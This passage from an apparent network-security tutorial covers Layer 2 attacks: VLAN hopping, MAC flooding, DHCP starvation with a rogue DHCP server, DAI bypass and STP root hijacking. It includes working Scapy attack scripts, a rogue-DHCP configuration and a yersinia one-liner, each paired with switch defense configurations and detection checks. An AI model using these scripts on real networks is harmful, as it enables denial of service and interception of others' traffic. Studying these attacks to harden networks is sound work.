    return frame


def main() -> None:
    ap = argparse.ArgumentParser()
    ap.add_argument("-i", "--iface", required=True)
    ap.add_argument("--src-mac", required=True)
    ap.add_argument("--outer", type=int, required=True, help="outer VLAN — must match trunk native VLAN")
    ap.add_argument("--inner", type=int, required=True, help="inner VLAN — victim VLAN")
    ap.add_argument("--src-ip", required=True)
    ap.add_argument("--dst-ip", required=True)
    ap.add_argument("--payload", default="ATTACK-PROBE")
    args = ap.parse_args()

    frame = build_double_tagged(
        args.src_mac, args.outer, args.inner,
        args.src_ip, args.dst_ip, args.payload.encode(),
    )

    sendp(frame, iface=args.iface, count=10, verbose=True)
    print("[*] Check for 'ATTACK-PROBE' string on mirrored port or victim host")


if __name__ == "__main__":
    main()
```

### 4.3 Defense — Make Native VLAN a "Garbage VLAN"

```
! Designate a VLAN never used for real traffic as native
vlan 999
 name UNUSED_NATIVE
interface range GigabitEthernet0/23 - 24
 switchport trunk native vlan 999
 switchport trunk allowed vlan remove 999   ! Remove native VLAN from trunk allowed list
 ! Or more strongly — force tagging of native VLAN
 switchport trunk native vlan tag
```

## 5. CAM Table Overflow (MAC Flooding)

### 5.1 Attack Principle

A switch's CAM (Content Addressable Memory) table has limited size. If an attacker floods with **tens of thousands of fake source MACs**, the table fills up and the switch starts **flooding frames with unknown destination MACs to all ports** (acting like a hub). Result: traffic from other ports becomes visible on the attacker's port.

### 5.2 Scapy Implementation — macof Alternative

```python
#!/usr/bin/env python3
"""mac_flood.py — Random MAC frame generator to trigger CAM table overflow."""
from __future__ import annotations

import argparse
import os
import random
import time

from scapy.all import sendp, Ether, IP, UDP, Raw, RandMAC, RandIP


def flood(iface: str, rate: int, duration: int) -> None:
    start = time.time()
    sent = 0

    batch_size = 200
    while time.time() - start < duration:
        batch = [
            Ether(src=str(RandMAC()), dst="ff:ff:ff:ff:ff:ff") /
            IP(src=str(RandIP()), dst=str(RandIP())) /
            UDP(sport=random.randint(1024, 65535), dport=random.randint(1024, 65535)) /
            Raw(load=os.urandom(60))
            for _ in range(batch_size)
        ]
        sendp(batch, iface=iface, verbose=False)
        sent += batch_size

        elapsed = time.time() - start
        expected = elapsed * rate
        if sent > expected:
            time.sleep(0.01)

    print(f"[+] {sent} frames sent in {duration}s (~{sent/duration:.0f} fps)")


def main() -> None:
    ap = argparse.ArgumentParser()
    ap.add_argument("-i", "--iface", required=True)
    ap.add_argument("-r", "--rate", type=int, default=5000)
    ap.add_argument("-t", "--duration", type=int, default=30)
    args = ap.parse_args()

    flood(args.iface, args.rate, args.duration)


if __name__ == "__main__":
    main()
```

### 5.3 Defense — Port Security

```
interface GigabitEthernet0/1
 switchport port-security                          ! Enable feature
 switchport port-security maximum 2                ! Max 2 MACs per port
 switchport port-security mac-address sticky       ! Stick first seen MAC
 switchport port-security violation restrict       ! On violation, block only that MAC
```

`shutdown` mode disables the port which is operationally burdensome. `restrict` is the practical compromise.

## 6. DHCP Starvation + Rogue DHCP

### 6.1 Attack Flow

1. **Starvation**: Attacker sends massive DHCPDISCOVER with fake MACs, exhausting the DHCP pool. Legitimate users can't get IPs.
2. **Rogue DHCP**: Attacker sets up their own DHCP server and responds with their IP as the default gateway/DNS. All traffic from new clients passes through them.

### 6.2 Scapy-based DHCP Starvation

```python
#!/usr/bin/env python3
"""dhcp_starvation.py — DISCOVER flood that exhausts the DHCP pool."""
from __future__ import annotations

import argparse
import random
import time

from scapy.all import sendp, Ether, IP, UDP, BOOTP, DHCP, RandMAC


def random_xid() -> int:
    return random.randint(0, 0xFFFFFFFF)


def dhcp_discover(src_mac: str) -> Ether:
    frame = (
        Ether(src=src_mac, dst="ff:ff:ff:ff:ff:ff") /
        IP(src="0.0.0.0", dst="255.255.255.255") /
        UDP(sport=68, dport=67) /
        BOOTP(
            chaddr=bytes.fromhex(src_mac.replace(":", "")) + b"\x00" * 10,
            xid=random_xid(),
            flags=0x8000,
        ) /
        DHCP(options=[
            ("message-type", "discover"),
            ("param_req_list", [1, 3, 6, 15, 31, 33, 43, 44, 46, 47, 119, 121]),
            "end",
        ])
    )
    return frame


def main() -> None:
    ap = argparse.ArgumentParser()
    ap.add_argument("-i", "--iface", required=True)
    ap.add_argument("-r", "--rate", type=float, default=5.0)
    ap.add_argument("-t", "--duration", type=int, default=60)
    args = ap.parse_args()

    interval = 1.0 / args.rate
    end = time.time() + args.duration
    count = 0

    while time.time() < end:
        fake_mac = str(RandMAC())
        sendp(dhcp_discover(fake_mac), iface=args.iface, verbose=False)
        count += 1
        time.sleep(interval)

    print(f"[+] {count} DISCOVER sent in {args.duration}s")


if __name__ == "__main__":
    main()
```

### 6.3 Setting Up Rogue DHCP

Running an actual Rogue DHCP server is simplest with **`dnsmasq`**:

```bash
sudo apt install dnsmasq

cat > /tmp/dnsmasq-rogue.conf <<EOF
interface=eth0
dhcp-range=10.0.0.100,10.0.0.200,12h
dhcp-option=option:router,10.0.0.250        # Attacker IP as gateway
dhcp-option=option:dns-server,10.0.0.250    # DNS also attacker IP
EOF

sudo dnsmasq -C /tmp/dnsmasq-rogue.conf --no-daemon --log-dhcp
```

Enable `echo 1 > /proc/sys/net/ipv4/ip_forward` and set up iptables NAT or packet inspection for complete MITM.

### 6.4 Defense — DHCP Snooping

```
! Global activation
ip dhcp snooping
ip dhcp snooping vlan 10,20,30

! Only trust interfaces with legitimate DHCP servers
interface GigabitEthernet0/24
 description DHCP_SERVER_UPLINK
 ip dhcp snooping trust

! Other ports automatically 'untrusted' — blocks client sending server responses
! Also blocks DHCP Starvation by checking source MAC != chaddr
ip dhcp snooping verify mac-address
```

## 7. ARP Spoofing + DAI (Dynamic ARP Inspection) Bypass

### 7.1 Basic ARP Spoofing in Section 02

Basic ARP spoofing concept was covered in section 02, so here we focus on **bypassing DAI in environments where it's enabled**.

### 7.2 How DAI Works

When DHCP Snooping creates a binding table, DAI checks whether the **MAC↔IP mapping in ARP responses** from each port matches the binding. Non-matching responses are dropped.

### 7.3 Bypass Ideas

- **VLANs without DHCP Snooping**: DAI depends on DHCP Snooping bindings, so VLANs without snooping pass automatically if there's no static ARP ACL.
- **Static ARP entries**: Manually assigned entries may not be in the binding table. Static ACL is needed but often omitted.
- **Trusted ports**: If an admin marked a port as trusted out of convenience, an attacker on that port can freely manipulate ARP responses.

### 7.4 Complete L2 Defense Stack — Practical Template

```
! 1. DHCP Snooping
ip dhcp snooping
ip dhcp snooping vlan 10,20,30
ip dhcp snooping verify mac-address

! 2. DAI
ip arp inspection vlan 10,20,30
ip arp inspection validate src-mac dst-mac ip
ip arp inspection log-buffer entries 1024

! 3. IP Source Guard — prevents IP spoofing using same binding table
interface range GigabitEthernet0/1 - 23
 ip verify source port-security

! 4. Port Security
interface range GigabitEthernet0/1 - 23
 switchport port-security maximum 2
 switchport port-security violation restrict
 switchport port-security mac-address sticky

! 5. BPDU Guard — drop port if BPDU arrives on access port
interface range GigabitEthernet0/1 - 23
 spanning-tree portfast
 spanning-tree bpduguard enable

! 6. Storm Control — limit broadcast flooding
interface range GigabitEthernet0/1 - 23
 storm-control broadcast level 1.00
 storm-control action shutdown
```

## 8. STP Root Bridge Hijacking

### 8.1 Concept

Spanning Tree elects the switch with the lowest Bridge ID as root. If an attacker forges BPDUs claiming **Bridge Priority 0**, they become root. Result: certain traffic flows within the network are redesigned to pass through the attacker's port.

### 8.2 Yersinia One-liner

Direct implementation is possible but **yersinia** is fastest:

```bash
sudo yersinia -I

# Or one-liner CLI:
sudo yersinia stp -attack 4 -interface eth0
```

### 8.3 Defense — BPDU Guard + Root Guard

- **BPDU Guard**: When BPDU arrives on access port, put it into err-disabled state
- **Root Guard**: When a "superior" BPDU arrives on a specific port, put it in "root-inconsistent" state (set on ports that should face the root)

```
interface GigabitEthernet0/1
 spanning-tree bpduguard enable     ! access port
interface GigabitEthernet0/23
 spanning-tree guard root           ! downlink port
```

## 9. 2026 Latest CVE — Catalyst DHCP Snooping BOOTP Leak

CVE-2026-20084 disclosed in March 2026 involves **BOOTP packets leaking between VLANs where DHCP Snooping is enabled** on unpatched Catalyst 9000 devices. When an attacker sends specially crafted BOOTP requests from VLAN 10, another VLAN's switch CPU processes them causing high load → DoS.

**Reproduction conditions**:
- Catalyst 9000 series, IOS XE 17.x (specific versions)
- `ip dhcp snooping` enabled + multiple VLANs

**Defense**:
- Upgrade to Cisco PSIRT recommended version (IOS XE 17.15.x, etc.)
- Or temporarily disable DHCP Snooping on affected VLANs and use port-security + DAI static ACL as alternative controls

## 10. Conclusion

Layer 2 attacks are often called "classics," but in 2026 field audits, networks with all the above defenses properly configured are a minority. The next document (03) moves to a higher layer to cover **routing protocol attacks** — OSPF LSA injection, BGP route hijacking, HSRP hijacking.

<!-- detect-validate-32 -->
## Layer 2 Attack Detection and Defense Validation

L2 attacks break switch-domain boundaries via *MAC flooding, ARP spoofing, VLAN hopping, STP manipulation, and DHCP starvation*. Defenders must verify **whether their switch blocks and detects these with L2 controls**. Validate only on **owned networks**.

### Attack -> Targeted weakness -> Primary control (defender) -> Detection signal

| Technique | Targeted weakness | Primary control (defender) | Detection signal |
|---|---|---|---|
| MAC flooding | CAM table limit | port-security | MAC table surge |
| ARP spoofing | Unvalidated ARP | DAI (Dynamic ARP Inspection) | Multiple ARP mappings |
| VLAN hopping | DTP/trunk auto | Disable DTP, explicit trunk | Abnormal trunk negotiation |
| STP manipulation (root hijack) | BPDU trust | BPDU Guard, Root Guard | Abnormal root change |

### Defense validation (verify directly)

```bash
# 1) Check your network for ARP-spoofing signals (owned network) — one MAC spoofing many IPs
ip neigh show 2>/dev/null | awk '{print $5}' | sort | uniq -c | sort -rn | head
# 2) Monitor ARP-table flips — a MAC change for the same IP suggests spoofing (arpwatch recommended)
arp -an 2>/dev/null | sort | head
```

> L2 defense is *whether controls actually block spoofing* -- "the switch works" differs from "port-security/DAI are applied so multiple ARP mappings are blocked and detected". Confirm ARP mappings and flips on owned networks directly ([[02_Network_Hacking]], [[24_Network_Infrastructure_Security]], [[13_SOC_Blue_Team]]).
